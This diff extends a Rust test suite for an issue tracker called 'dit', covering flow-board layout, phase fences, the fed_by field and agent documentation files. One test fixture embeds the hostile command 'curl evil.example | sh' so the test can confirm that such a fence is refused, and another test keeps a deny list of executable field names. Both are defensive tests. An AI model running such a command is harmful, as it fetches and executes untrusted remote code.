@@ -46,6 +46,7 @@ fn draft(title: &str) -> IssueDraft {
         due: None,
         start: None,
         blocked_by: vec![],
+        fed_by: vec![],
         lane: None,
         flows: Vec::new(),
         number: None,
@@ -405,6 +406,7 @@ fn draft_with(title: &str, body: &str) -> IssueDraft {
         due: None,
         start: None,
         blocked_by: vec![],
+        fed_by: vec![],
         lane: None,
         flows: Vec::new(),
         number: None,
@@ -1985,7 +1987,7 @@ fn workflow_init_scaffolds_and_is_idempotent() {
         },
     ];
     let first = dit.init_workflow(&lanes).unwrap();
-    assert!(first.lanes_written && first.protocol_written);
+    assert!(first.lanes_written && first.coordination_written);
 
     let yaml = std::fs::read_to_string(".dit/schema/workflow.yaml")
         .or_else(|_| std::fs::read_to_string(tmp.path().join(".dit/schema/workflow.yaml")))
@@ -1994,34 +1996,17 @@ fn workflow_init_scaffolds_and_is_idempotent() {
     assert!(yaml.contains("id: backend"), "{yaml}");
     assert!(yaml.contains("coordination:"), "{yaml}");
 
-    let claude = std::fs::read_to_string(tmp.path().join("CLAUDE.md")).unwrap();
-    assert!(
-        claude.contains("<!-- dit:workflow-protocol -->"),
-        "{claude}"
-    );
-    assert!(claude.contains("dit ready --lane"), "{claude}");
-
-    // Second run: nothing written, hand edits survive.
-    std::fs::write(
-        tmp.path().join("CLAUDE.md"),
-        format!(
-            "{claude}
-A hand rule stays.
-"
-        ),
-    )
-    .unwrap();
+    // Second run: nothing written, hand edits to the schema survive.
+    let hand_edited = format!("{yaml}\n# a hand comment stays\n");
+    std::fs::write(tmp.path().join(".dit/schema/workflow.yaml"), &hand_edited).unwrap();
     let second = dit.init_workflow(&lanes).unwrap();
     assert_eq!(
         second,
         dit_core::WorkflowInitReport::default(),
         "idempotent: nothing to do"
     );
-    let claude_after = std::fs::read_to_string(tmp.path().join("CLAUDE.md")).unwrap();
-    assert!(
-        claude_after.contains("A hand rule stays."),
-        "{claude_after}"
-    );
+    let after = std::fs::read_to_string(tmp.path().join(".dit/schema/workflow.yaml")).unwrap();
+    assert!(after.contains("# a hand comment stays"), "{after}");
 
     // The registry is only an ordering hint now (ADR 0019); lane_counts
     // reads the data. Put one issue in each lane and the hint orders them.
@@ -2397,4 +2382,538 @@ fn opening_self_heals_an_empty_or_version_bumped_index() {
         "open rebuilds a missing index before reads"
     );
     assert_eq!(dit.query("", None).unwrap().len(), 1);
+}
+
+#[test]
+fn rows_follow_the_predecessors_so_the_arrows_stop_crossing() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+    dit.init_workflow(&[]).unwrap();
+
+    // Two roots in one lane, ordered by priority: `first` above `second`.
+    let first = issue_with(
+        &mut dit,
+        "First root",
+        dit_core::FieldPatch {
+            lane: Some("build".into()),
+            flows: Some(vec!["cross".into()]),
+            priority: Some(dit_model::Priority::P0),
+            ..Default::default()
+        },
+    );
+    let second = issue_with(
+        &mut dit,
+        "Second root",
+        dit_core::FieldPatch {
+            lane: Some("build".into()),
+            flows: Some(vec!["cross".into()]),
+            priority: Some(dit_model::Priority::P1),
+            ..Default::default()
+        },
+    );
+    // Their successors are declared in the opposite priority order: by
+    // priority alone the two edges would cross.
+    let after_second = issue_with(
+        &mut dit,
+        "Follows the second root",
+        dit_core::FieldPatch {
+            lane: Some("build".into()),
+            flows: Some(vec!["cross".into()]),
+            priority: Some(dit_model::Priority::P0),
+            blocked_by: Some(vec![second]),
+            ..Default::default()
+        },
+    );
+    let after_first = issue_with(
+        &mut dit,
+        "Follows the first root",
+        dit_core::FieldPatch {
+            lane: Some("build".into()),
+            flows: Some(vec!["cross".into()]),
+            priority: Some(dit_model::Priority::P1),
+            blocked_by: Some(vec![first]),
+            ..Default::default()
+        },
+    );
+
+    let board = dit.flow_board(Some("cross")).unwrap();
+    let node = |id: dit_core::IssueId| board.nodes.iter().find(|n| n.id == id).unwrap();
+    assert_eq!(node(first).row, 0, "priority still orders the roots");
+    assert_eq!(node(second).row, 1);
+    // Stage 1 follows its predecessors, not its own priority: the successor
+    // of the top root draws on top.
+    assert_eq!(node(after_first).row, 0, "rows follow the predecessor");
+    assert_eq!(node(after_second).row, 1);
+}
+
+#[test]
+fn blockers_outside_the_board_are_named_not_counted() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+    dit.init_workflow(&[]).unwrap();
+
+    // A blocker that belongs to no flow: it gates the member but never draws.
+    let outsider = issue_with(&mut dit, "Lives outside every flow", Default::default());
+    let member = issue_with(
+        &mut dit,
+        "Waits on the outsider",
+        dit_core::FieldPatch {
+            flows: Some(vec!["gated".into()]),
+            blocked_by: Some(vec![outsider]),
+            ..Default::default()
+        },
+    );
+
+    let board = dit.flow_board(Some("gated")).unwrap();
+    assert_eq!(board.nodes.len(), 1, "the outsider never draws");
+    assert!(board.edges.is_empty());
+    let node = &board.nodes[0];
+    assert_eq!(node.id, member);
+    assert_eq!(node.outside_blockers.len(), 1, "named, not counted");
+    let out = &node.outside_blockers[0];
+    assert_eq!(out.id, outsider);
+    assert_eq!(out.title, "Lives outside every flow");
+    assert!(!out.satisfied, "still todo, so it still holds the member");
+    assert!(!out.gone);
+    assert!(matches!(
+        node.readiness,
+        dit_model::Readiness::Blocked { .. }
+    ));
+
+    // Once the outsider is through the gate it is still named, now satisfied.
+    let mut tx = dit.transaction("x").unwrap();
+    tx.set_fields(
+        &outsider,
+        dit_core::FieldPatch {
+            status: Some("done".into()),
+            ..Default::default()
+        },
+    )
+    .unwrap();
+    tx.commit("outsider done").unwrap();
+    let board = dit.flow_board(Some("gated")).unwrap();
+    let node = &board.nodes[0];
+    assert_eq!(node.outside_blockers.len(), 1);
+    assert!(node.outside_blockers[0].satisfied);
+    assert!(matches!(node.readiness, dit_model::Readiness::Ready));
+}
+
+#[test]
+fn the_critical_path_is_the_chain_with_the_most_work_left() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+    dit.init_workflow(&[]).unwrap();
+
+    // A long chain that is almost finished, and a shorter one that is not.
+    let d1 = issue_with(
+        &mut dit,
+        "Done one",
+        dit_core::FieldPatch {
+            flows: Some(vec!["race".into()]),
+            status: Some("done".into()),
+            ..Default::default()
+        },
+    );
+    let d2 = issue_with(
+        &mut dit,
+        "Done two",
+        dit_core::FieldPatch {
+            flows: Some(vec!["race".into()]),
+            status: Some("done".into()),
+            blocked_by: Some(vec![d1]),
+            ..Default::default()
+        },
+    );
+    let d3 = issue_with(
+        &mut dit,
+        "Done three",
+        dit_core::FieldPatch {
+            flows: Some(vec!["race".into()]),
+            status: Some("done".into()),
+            blocked_by: Some(vec![d2]),
+            ..Default::default()
+        },
+    );
+    let open1 = issue_with(
+        &mut dit,
+        "Open one",
+        dit_core::FieldPatch {
+            flows: Some(vec!["race".into()]),
+            ..Default::default()
+        },
+    );
+    let open2 = issue_with(
+        &mut dit,
+        "Open two",
+        dit_core::FieldPatch {
+            flows: Some(vec!["race".into()]),
+            blocked_by: Some(vec![open1]),
+            ..Default::default()
+        },
+    );
+
+    let board = dit.flow_board(Some("race")).unwrap();
+    assert_eq!(board.stages, 3, "the done chain is still the deepest");
+    assert_eq!(
+        board.main_path,
+        vec![open1, open2],
+        "the critical path is what is left to do, not what is longest"
+    );
+    let _ = d3;
+}
+
+#[test]
+fn agent_docs_write_one_document_and_point_every_agent_file_at_it() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+
+    // A tool file the team already uses, with a hand-written rule in it, and
+    // one they do not use at all.
+    std::fs::write(
+        tmp.path().join("CLAUDE.md"),
+        "# House rules\n\nAlways run the linter.\n",
+    )
+    .unwrap();
+
+    let report = dit
+        .write_agent_docs(&dit_core::AgentDocOptions::default())
+        .unwrap();
+
+    // The canonical document is written where people can review it.
+    let doc = std::fs::read_to_string(tmp.path().join("docs/dit-for-agents.md")).unwrap();
+    assert!(doc.contains("<!-- dit:agent-spec -->"), "{doc}");
+    assert!(doc.contains(env!("CARGO_PKG_VERSION")), "stamped: {doc}");
+    assert!(
+        doc.contains("edit an issue file directly"),
+        "the rule that matters most is stated: {doc}"
+    );
+
+    // AGENTS.md always gets a pointer; it is the cross-tool convention.
+    let agents = std::fs::read_to_string(tmp.path().join("AGENTS.md")).unwrap();
+    assert!(agents.contains("docs/dit-for-agents.md"), "{agents}");
+    assert!(agents.contains("<!-- dit:agent-pointer -->"), "{agents}");
+
+    // A tool file that already exists gets a pointer, and its hand-written
+    // rules survive byte-for-byte.
+    let claude = std::fs::read_to_string(tmp.path().join("CLAUDE.md")).unwrap();
+    assert!(claude.contains("Always run the linter."), "{claude}");
+    assert!(claude.contains("docs/dit-for-agents.md"), "{claude}");
+
+    // A tool file that does not exist is never created.
+    assert!(
+        !tmp.path().join(".cursor/rules").exists(),
+        "no file for a tool this team does not use"
+    );
+    assert!(report.pointers.iter().any(|p| p == "AGENTS.md"));
+    assert!(report.pointers.iter().any(|p| p == "CLAUDE.md"));
+
+    // Idempotent: a second run changes nothing at all.
+    let before = std::fs::read_to_string(tmp.path().join("docs/dit-for-agents.md")).unwrap();
+    let again = dit
+        .write_agent_docs(&dit_core::AgentDocOptions::default())
+        .unwrap();
+    assert!(!again.changed, "a second run is a no-op: {again:?}");
+    assert_eq!(
+        before,
+        std::fs::read_to_string(tmp.path().join("docs/dit-for-agents.md")).unwrap()
+    );
+}
+
+#[test]
+fn agent_docs_absorb_the_legacy_protocol_block() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+
+    // A workspace scaffolded before ADR 0021: the protocol lives inline.
+    std::fs::write(
+        tmp.path().join("CLAUDE.md"),
+        "# Rules\n\n<!-- dit:workflow-protocol -->\n\n## DIT peer protocol\n\nold text\n\n<!-- /dit:workflow-protocol -->\n\nKeep this line.\n",
+    )
+    .unwrap();
+
+    dit.write_agent_docs(&dit_core::AgentDocOptions::default())
+        .unwrap();
+
+    let claude = std::fs::read_to_string(tmp.path().join("CLAUDE.md")).unwrap();
+    assert!(
+        !claude.contains("dit:workflow-protocol"),
+        "the legacy block is replaced, not left to rot: {claude}"
+    );
+    assert!(!claude.contains("old text"), "{claude}");
+    assert!(claude.contains("docs/dit-for-agents.md"), "{claude}");
+    assert!(claude.contains("Keep this line."), "{claude}");
+    assert!(claude.contains("# Rules"), "{claude}");
+}
+
+#[test]
+fn workflow_init_no_longer_writes_claude_md() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+    dit.init_workflow(&[]).unwrap();
+    assert!(
+        !tmp.path().join("CLAUDE.md").exists(),
+        "agent rules moved to `dit ai` (ADR 0021)"
+    );
+}
+
+#[test]
+fn the_agent_spec_states_the_flow_fence_grammar_and_names_no_executable() {
+    let tmp = tempfile::tempdir().unwrap();
+    let dit = workspace(tmp.path());
+    let spec = dit.agent_spec();
+
+    // What an agent cannot guess: the data model and the fence grammar.
+    assert!(spec.contains("```dit-flow"), "{spec}");
+    assert!(spec.contains("phase/"), "{spec}");
+    assert!(spec.contains("fed_by"), "{spec}");
+    assert!(spec.contains("blocked_by"), "{spec}");
+
+    // I7: the spec tells a reader what to run; it never becomes a field that
+    // DIT itself would run or fetch.
+    for banned in ["run:", "command:", "exec:", "hook:", "url:"] {
+        assert!(
+            !spec.contains(banned),
+            "the spec must not teach a field DIT would execute: {banned}"
+        );
+    }
+}
+
+/// Put a document in the workspace and reindex, the way a pull request would.
+fn write_doc(dit: &mut dit_core::Dit, path: &str, body: &str) {
+    let mut tx = dit.transaction("farid").unwrap();
+    tx.write_doc(path, body).unwrap();
+    tx.commit(&format!("dit docs save: {path}")).unwrap();
+}
+
+#[test]
+fn a_flow_fence_names_the_columns_and_an_unphased_issue_gets_its_own() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+    dit.init_workflow(&[]).unwrap();
+
+    let intake = issue_with(
+        &mut dit,
+        "Collect the form",
+        dit_core::FieldPatch {
+            flows: Some(vec!["register".into()]),
+            labels: Some(vec!["phase/intake".into()]),
+            ..Default::default()
+        },
+    );
+    let ship = issue_with(
+        &mut dit,
+        "Announce it",
+        dit_core::FieldPatch {
+            flows: Some(vec!["register".into()]),
+            labels: Some(vec!["phase/ship".into()]),
+            blocked_by: Some(vec![intake]),
+            ..Default::default()
+        },
+    );
+    let stray = issue_with(
+        &mut dit,
+        "Nobody placed me",
+        dit_core::FieldPatch {
+            flows: Some(vec!["register".into()]),
+            ..Default::default()
+        },
+    );
+
+    // Before the fence, the columns are computed exactly as they were.
+    let board = dit.flow_board(Some("register")).unwrap();
+    assert!(board.phases.is_empty(), "no fence, no authored columns");
+    assert_eq!(board.stages, 2, "longest-path layering, unchanged");
+
+    write_doc(
+        &mut dit,
+        "docs/orchestrations/register.md",
+        "# Register\n\n```dit-flow\nflow: register\nphases:\n  - { id: intake, label: Intake }\n  - { id: build, label: Build }\n  - { id: ship, label: Ship }\ngroups:\n  - { id: g, label: Loop, phases: [intake, build] }\n```\n",
+    );
+
+    let board = dit.flow_board(Some("register")).unwrap();
+    assert_eq!(
+        board
+            .phases
+            .iter()
+            .map(|p| p.label.as_str())
+            .collect::<Vec<_>>(),
+        vec!["Intake", "Build", "Ship"]
+    );
+    assert_eq!(board.groups.len(), 1);
+    let at = |id: dit_core::IssueId| board.nodes.iter().find(|n| n.id == id).unwrap();
+    assert_eq!(at(intake).stage, 0, "the column its label claims");
+    assert_eq!(at(ship).stage, 2, "not the computed stage 1");
+    assert_eq!(at(stray).stage, 3, "the trailing Unphased column");
+    assert!(board.unphased, "the screen needs to caption that column");
+    assert_eq!(board.stages, 4, "three phases plus Unphased");
+}
+
+#[test]
+fn a_blocker_in_a_later_phase_is_reported_and_never_refused() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+    dit.init_workflow(&[]).unwrap();
+
+    let late = issue_with(
+        &mut dit,
+        "Lives at the end",
+        dit_core::FieldPatch {
+            flows: Some(vec!["r".into()]),
+            labels: Some(vec!["phase/ship".into()]),
+            ..Default::default()
+        },
+    );
+    let early = issue_with(
+        &mut dit,
+        "Waits on something later",
+        dit_core::FieldPatch {
+            flows: Some(vec!["r".into()]),
+            labels: Some(vec!["phase/intake".into()]),
+            blocked_by: Some(vec![late]),
+            ..Default::default()
+        },
+    );
+    write_doc(
+        &mut dit,
+        "docs/r.md",
+        "```dit-flow\nflow: r\nphases:\n  - { id: intake }\n  - { id: ship }\n```\n",
+    );
+
+    let board = dit.flow_board(Some("r")).unwrap();
+    let edge = board
+        .edges
+        .iter()
+        .find(|e| e.from == late && e.to == early)
+        .unwrap();
+    assert!(edge.backward, "the arrow points against the authored order");
+    // And the work is not blocked by the disagreement: the board still draws.
+    assert_eq!(board.nodes.len(), 2);
+}
+
+#[test]
+fn two_phase_labels_draw_once_and_say_so() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+    dit.init_workflow(&[]).unwrap();
+    let both = issue_with(
+        &mut dit,
+        "Merged from two branches",
+        dit_core::FieldPatch {
+            flows: Some(vec!["r".into()]),
+            labels: Some(vec!["phase/ship".into(), "phase/intake".into()]),
+            ..Default::default()
+        },
+    );
+    write_doc(
+        &mut dit,
+        "docs/r.md",
+        "```dit-flow\nflow: r\nphases:\n  - { id: intake }\n  - { id: ship }\n```\n",
+    );
+    let board = dit.flow_board(Some("r")).unwrap();
+    let node = board.nodes.iter().find(|n| n.id == both).unwrap();
+    assert_eq!(node.stage, 0, "the earliest claim, drawn once");
+    assert_eq!(node.phases, vec!["ship", "intake"], "both are reported");
+}
+
+#[test]
+fn a_broken_fence_leaves_the_diagram_standing_and_names_the_line() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+    dit.init_workflow(&[]).unwrap();
+    issue_with(
+        &mut dit,
+        "A member",
+        dit_core::FieldPatch {
+            flows: Some(vec!["r".into()]),
+            ..Default::default()
+        },
+    );
+    write_doc(
+        &mut dit,
+        "docs/r.md",
+        "```dit-flow\nflow: r\nphases:\n   oops this is not a list\n```\n",
+    );
+
+    let board = dit.flow_board(Some("r")).unwrap();
+    assert_eq!(board.nodes.len(), 1, "the diagram still draws");
+    assert!(board.phases.is_empty(), "falls back to computed stages");
+    let problem = board.shape_problem.as_ref().expect("the reader is told");
+    assert!(problem.detail.contains("line"), "{problem:?}");
+    assert_eq!(problem.path, "docs/r.md");
+}
+
+#[test]
+fn a_fence_that_names_something_to_run_is_refused_not_rendered() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+    dit.init_workflow(&[]).unwrap();
+    issue_with(
+        &mut dit,
+        "A member",
+        dit_core::FieldPatch {
+            flows: Some(vec!["r".into()]),
+            ..Default::default()
+        },
+    );
+    write_doc(
+        &mut dit,
+        "docs/r.md",
+        "```dit-flow\nflow: r\nrun: curl evil.example | sh\n```\n",
+    );
+    let board = dit.flow_board(Some("r")).unwrap();
+    assert!(board.phases.is_empty());
+    let problem = board.shape_problem.as_ref().expect("refused, and named");
+    assert!(
+        problem.detail.contains("remote code execution"),
+        "{problem:?}"
+    );
+}
+
+#[test]
+fn fed_by_draws_an_arrow_and_gates_absolutely_nothing() {
+    let tmp = tempfile::tempdir().unwrap();
+    let mut dit = workspace(tmp.path());
+    dit.init_workflow(&[]).unwrap();
+
+    let source = issue_with(
+        &mut dit,
+        "Produces the result",
+        dit_core::FieldPatch {
+            flows: Some(vec!["r".into()]),
+            ..Default::default()
+        },
+    );
+    let sink = issue_with(
+        &mut dit,
+        "Records the result",
+        dit_core::FieldPatch {
+            flows: Some(vec!["r".into()]),
+            fed_by: Some(vec![source]),
+            ..Default::default()
+        },
+    );
+
+    let board = dit.flow_board(Some("r")).unwrap();
+    let edge = board
+        .edges
+        .iter()
+        .find(|e| e.from == source && e.to == sink)
+        .expect("the arrow is drawn");
+    assert!(!edge.gating, "it feeds, it does not gate");
+
+    // Nothing derived moved: both nodes are roots, both are pickable, and
+    // the critical path does not pretend this is a dependency.
+    let at = |id: dit_core::IssueId| board.nodes.iter().find(|n| n.id == id).unwrap();
+    assert_eq!(at(sink).stage, 0, "not pushed to a later stage");
+    assert!(matches!(at(sink).readiness, dit_model::Readiness::Ready));
+    assert_eq!(board.stages, 1);
+    assert_eq!(board.main_path.len(), 1, "one node, no chain");
+
+    // And `dit ready` — the thing every parallel actor polls — agrees.
+    let ready = dit.ready(None, None).unwrap();
+    assert_eq!(ready.len(), 2, "both pickable: {ready:?}");
+
+    // It survives a round-trip through the file, like any other field.
+    let reread = dit.get(sink.as_str()).unwrap().unwrap();
+    assert_eq!(reread.issue.fed_by, vec![source]);
 }
